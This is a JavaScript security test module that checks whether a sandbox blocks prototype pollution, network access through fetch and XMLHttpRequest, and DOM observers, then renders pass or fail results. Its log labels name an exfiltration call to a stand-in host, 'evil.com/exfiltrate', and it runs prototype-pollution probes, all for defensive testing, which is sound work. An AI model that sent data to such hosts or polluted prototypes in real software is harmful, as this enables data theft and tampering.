// Home/Test/testsecurity.js
// Security test module for SES isolation fixes
// Tests: Prototype pollution, network blocking, observer blocking
// @tags: test, security, ses, isolation

(function() {
  'use strict';

  function createTestsecurity(options) {
    const container = options.container;
    const instanceId = options.instanceId;
    const tunnel = options.tunnel;
    const themeController = options.themeController;
    const dynamicRender = options.dynamicRender;
    
    console.log('═══════════════════════════════════════════════════');
    console.log('🔒 SECURITY FIX TEST MODULE');
    console.log('═══════════════════════════════════════════════════');
    console.log('[TestSecurity] Instance ID:', instanceId);
    
    let testResults = {
      prototypeProtection: null,
      networkBlocking: null,
      observerBlocking: null
    };
    
    // ═══════════════════════════════════════════════════════════
    // TEST 1: PROTOTYPE POLLUTION PREVENTION (harden() fix)
    // ═══════════════════════════════════════════════════════════
    console.log('\n🧪 TEST 1: Prototype Pollution Prevention');
    console.log('─────────────────────────────────────────');
    
    try {
      // Attempt 1: Modify tunnel prototype
      console.log('[Test 1.1] Attempting: tunnel.__proto__.evil = true');
      tunnel.__proto__.evil = true;
      testResults.prototypeProtection = '❌ FAIL';
      console.error('❌ FAIL: Prototype pollution allowed on tunnel');
    } catch (e) {
      testResults.prototypeProtection = '✅ PASS';
      console.log('✅ PASS: Prototype pollution blocked -', e.message);
    }
    
    try {
      // Attempt 2: Modify themeController properties
      console.log('[Test 1.2] Attempting: themeController.newProp = "hacked"');
      themeController.newProp = "hacked";
      testResults.prototypeProtection = '❌ FAIL';
      console.error('❌ FAIL: Property addition allowed on themeController');
    } catch (e) {
      if (testResults.prototypeProtection !== '❌ FAIL') {
        testResults.prototypeProtection = '✅ PASS';
      }
      console.log('✅ PASS: Property addition blocked -', e.message);
    }
    
    try {
      // Attempt 3: Modify dynamicRender constructor
      console.log('[Test 1.3] Attempting: dynamicRender.constructor.prototype.evil = fn');
      dynamicRender.constructor.prototype.evil = function() { return 'pwned'; };
      testResults.prototypeProtection = '❌ FAIL';
      console.error('❌ FAIL: Constructor prototype pollution allowed on dynamicRender');
    } catch (e) {
      if (testResults.prototypeProtection !== '❌ FAIL') {
        testResults.prototypeProtection = '✅ PASS';
      }
      console.log('✅ PASS: Constructor prototype blocked -', e.message);
    }
    
    // ═══════════════════════════════════════════════════════════
    // TEST 2: NETWORK ACCESS BLOCKING (fetch/XHR)
    // ═══════════════════════════════════════════════════════════
    console.log('\n🧪 TEST 2: Network Access Blocking');
    console.log('─────────────────────────────────────────');
    
    try {
      // Attempt 1: fetch()
      console.log('[Test 2.1] Attempting: fetch("https://evil.com/exfiltrate")');
      if (typeof fetch === 'undefined') {
        testResults.networkBlocking = '✅ PASS';
        console.log('✅ PASS: fetch() is undefined');
      } else {
        testResults.networkBlocking = '❌ FAIL';
        console.error('❌ FAIL: fetch() is available - can exfiltrate data');
      }
    } catch (e) {
      testResults.networkBlocking = '✅ PASS';
      console.log('✅ PASS: fetch() threw error -', e.message);
    }
    
    try {
      // Attempt 2: XMLHttpRequest
      console.log('[Test 2.2] Attempting: new XMLHttpRequest()');
      if (typeof XMLHttpRequest === 'undefined') {
        if (testResults.networkBlocking !== '❌ FAIL') {
          testResults.networkBlocking = '✅ PASS';
        }
        console.log('✅ PASS: XMLHttpRequest is undefined');
      } else {
        testResults.networkBlocking = '❌ FAIL';
        console.error('❌ FAIL: XMLHttpRequest is available');
      }
    } catch (e) {
      if (testResults.networkBlocking !== '❌ FAIL') {
        testResults.networkBlocking = '✅ PASS';
      }
      console.log('✅ PASS: XMLHttpRequest threw error -', e.message);
    }
    
    // ═══════════════════════════════════════════════════════════
    // TEST 3: OBSERVER BLOCKING (Mutation/Intersection/Resize)
    // ═══════════════════════════════════════════════════════════
    console.log('\n🧪 TEST 3: DOM Observer Blocking');
    console.log('─────────────────────────────────────────');
    
    try {
      // Attempt 1: MutationObserver
      console.log('[Test 3.1] Attempting: new MutationObserver(...)');
      if (typeof MutationObserver === 'undefined') {
        testResults.observerBlocking = '✅ PASS';
        console.log('✅ PASS: MutationObserver is undefined');
      } else {
        const observer = new MutationObserver(() => {});
        testResults.observerBlocking = '❌ FAIL';
        console.error('❌ FAIL: MutationObserver is available - can spy on parent DOM');
      }
    } catch (e) {
      testResults.observerBlocking = '✅ PASS';
      console.log('✅ PASS: MutationObserver blocked -', e.message);
    }
    
    try {
      // Attempt 2: IntersectionObserver
      console.log('[Test 3.2] Attempting: new IntersectionObserver(...)');
      if (typeof IntersectionObserver === 'undefined') {
        if (testResults.observerBlocking !== '❌ FAIL') {
          testResults.observerBlocking = '✅ PASS';
        }
        console.log('✅ PASS: IntersectionObserver is undefined');
      } else {
        const observer = new IntersectionObserver(() => {});
        testResults.observerBlocking = '❌ FAIL';
        console.error('❌ FAIL: IntersectionObserver is available');
      }
    } catch (e) {
      if (testResults.observerBlocking !== '❌ FAIL') {
        testResults.observerBlocking = '✅ PASS';
      }
      console.log('✅ PASS: IntersectionObserver blocked -', e.message);
    }
    
    try {
      // Attempt 3: ResizeObserver
      console.log('[Test 3.3] Attempting: new ResizeObserver(...)');
      if (typeof ResizeObserver === 'undefined') {
        if (testResults.observerBlocking !== '❌ FAIL') {
          testResults.observerBlocking = '✅ PASS';
        }
        console.log('✅ PASS: ResizeObserver is undefined');
      } else {
        const observer = new ResizeObserver(() => {});
        testResults.observerBlocking = '❌ FAIL';
        console.error('❌ FAIL: ResizeObserver is available');
      }
    } catch (e) {
      if (testResults.observerBlocking !== '❌ FAIL') {
        testResults.observerBlocking = '✅ PASS';
      }
      console.log('✅ PASS: ResizeObserver blocked -', e.message);
    }
    
    // ═══════════════════════════════════════════════════════════
    // RENDER RESULTS
    // ═══════════════════════════════════════════════════════════
    
    const allPassed = Object.values(testResults).every(r => r === '✅ PASS');
    
    container.innerHTML = `
      <style>
        .testsecurity-container {
          padding: 30px;
          font-family: 'Courier New', monospace;
          line-height: 1.8;
        }
        
        .testsecurity-header {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 25px;
          border-radius: 12px;
          margin-bottom: 30px;
          text-align: center;
        }
        
        .testsecurity-header h1 {
          margin: 0 0 10px 0;
          font-size: 28px;
          font-weight: bold;
        }
        
        .testsecurity-header p {
          margin: 0;
          opacity: 0.9;
          font-size: 14px;
        }
        
        .testsecurity-section {
          background: var(--bg-secondary, #2a2a2a);
          border-left: 4px solid var(--accent-color, #667eea);
          padding: 20px;
          margin-bottom: 20px;
          border-radius: 8px;
        }
        
        .testsecurity-section h2 {
          margin: 0 0 15px 0;
          color: var(--text-primary, #ffffff);
          font-size: 18px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .testsecurity-result {
          font-size: 24px;
          font-weight: bold;
          padding: 5px 12px;
          border-radius: 6px;
          display: inline-block;
        }
        
        .testsecurity-result.pass {
          background: rgba(34, 197, 94, 0.2);
          color: #22c55e;
        }
        
        .testsecurity-result.fail {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .testsecurity-section ul {
          margin: 10px 0 0 0;
          padding-left: 25px;
        }
        
        .testsecurity-section li {
          margin: 8px 0;
          color: var(--text-secondary, #cccccc);
        }
        
        .testsecurity-summary {
          background: ${allPassed ? 'rgba(34, 197, 94, 0.1)' : 'rgba(239, 68, 68, 0.1)'};
          border: 2px solid ${allPassed ? '#22c55e' : '#ef4444'};
          padding: 25px;
          border-radius: 12px;
          text-align: center;
          margin-top: 30px;
        }
        
        .testsecurity-summary h2 {
          margin: 0 0 15px 0;
          font-size: 32px;
          color: ${allPassed ? '#22c55e' : '#ef4444'};
        }
        
        .testsecurity-summary p {
          margin: 5px 0;
          font-size: 16px;
          color: var(--text-primary, #ffffff);
        }
        
        .testsecurity-console-note {
          background: rgba(102, 126, 234, 0.1);
          border-left: 4px solid #667eea;
          padding: 15px;
          margin-top: 20px;
          border-radius: 6px;
          font-size: 14px;
        }
        
        code {
          background: rgba(0, 0, 0, 0.3);
          padding: 2px 6px;
          border-radius: 4px;
          color: #22c55e;
          font-family: 'Courier New', monospace;
        }
      </style>
      
      <div class="testsecurity-container">
        <div class="testsecurity-header">
          <h1>🔒 Security Fix Verification</h1>
          <p>Testing: harden(), fetch() blocking, Observer blocking</p>
          <p style="opacity: 0.7; margin-top: 5px;">Instance: ${instanceId}</p>
        </div>
        
        <div class="testsecurity-section">
          <h2>
            <span>🧪 Test 1: Prototype Pollution Prevention</span>
            <span class="testsecurity-result ${testResults.prototypeProtection === '✅ PASS' ? 'pass' : 'fail'}">
              ${testResults.prototypeProtection}
            </span>
          </h2>
          <ul>
            <li>Attempted: <code>tunnel.__proto__.evil = true</code></li>
            <li>Attempted: <code>themeController.newProp = "hacked"</code></li>
            <li>Attempted: <code>dynamicRender.constructor.prototype.evil = fn</code></li>
            <li><strong>Expected:</strong> All attempts blocked by harden()</li>
          </ul>
        </div>
        
        <div class="testsecurity-section">
          <h2>
            <span>🧪 Test 2: Network Access Blocking</span>
            <span class="testsecurity-result ${testResults.networkBlocking === '✅ PASS' ? 'pass' : 'fail'}">
              ${testResults.networkBlocking}
            </span>
          </h2>
          <ul>
            <li>Checked: <code>typeof fetch === 'undefined'</code></li>
            <li>Checked: <code>typeof XMLHttpRequest === 'undefined'</code></li>
            <li><strong>Expected:</strong> Both undefined (prevents data exfiltration)</li>
          </ul>
        </div>
        
        <div class="testsecurity-section">
          <h2>
            <span>🧪 Test 3: DOM Observer Blocking</span>
            <span class="testsecurity-result ${testResults.observerBlocking === '✅ PASS' ? 'pass' : 'fail'}">
              ${testResults.observerBlocking}
            </span>
          </h2>
          <ul>
            <li>Checked: <code>typeof MutationObserver === 'undefined'</code></li>
            <li>Checked: <code>typeof IntersectionObserver === 'undefined'</code></li>
            <li>Checked: <code>typeof ResizeObserver === 'undefined'</code></li>
            <li><strong>Expected:</strong> All undefined (prevents parent DOM spying)</li>
          </ul>
        </div>
        
        <div class="testsecurity-summary">
          <h2>${allPassed ? '✅ ALL TESTS PASSED' : '❌ SOME TESTS FAILED'}</h2>
          <p>${allPassed 
            ? 'Security fixes are working correctly!' 
            : 'Apply the fixes to javascript/core/js-isolation.js'}</p>
          <p style="opacity: 0.7; margin-top: 10px;">
            ${allPassed ? '3/3 security features active' : 'Check console for details'}
          </p>
        </div>
        
        <div class="testsecurity-console-note">
          <strong>📋 Detailed Results:</strong> Check browser console for full test output.
          <br>All attack attempts and their outcomes are logged there.
        </div>
      </div>
    `;
    
    console.log('\n═══════════════════════════════════════════════════');
    console.log('📊 FINAL RESULTS:');
    console.log('═══════════════════════════════════════════════════');
    console.log('Prototype Protection:', testResults.prototypeProtection);
    console.log('Network Blocking:', testResults.networkBlocking);
    console.log('Observer Blocking:', testResults.observerBlocking);
    console.log('Overall Status:', allPassed ? '✅ SECURE' : '❌ VULNERABLE');
    console.log('═══════════════════════════════════════════════════\n');
    
    // Module API
    return {
      getState() {
        return { 
          testMode: true,
          results: testResults,
          allPassed: allPassed
        };
      },
      
      setState(state) {
        console.log('[TestSecurity] setState called:', state);
      },
      
      destroy() {
        console.log('[TestSecurity] destroy called - cleaning up');
        container.innerHTML = '';
      }
    };
  }
  
  // Register factory
  window.createTestsecurity = createTestsecurity;
  
  // Register metadata
  window.moduleInfo = {
    displayName: 'Security Fix Test',
    version: '1.0.0',
    description: 'Tests harden(), fetch blocking, and Observer blocking'
  };
  
  // Notify ready
  if (typeof window.__moduleReady === 'function') {
    window.__moduleReady('createTestsecurity');
  }
})();
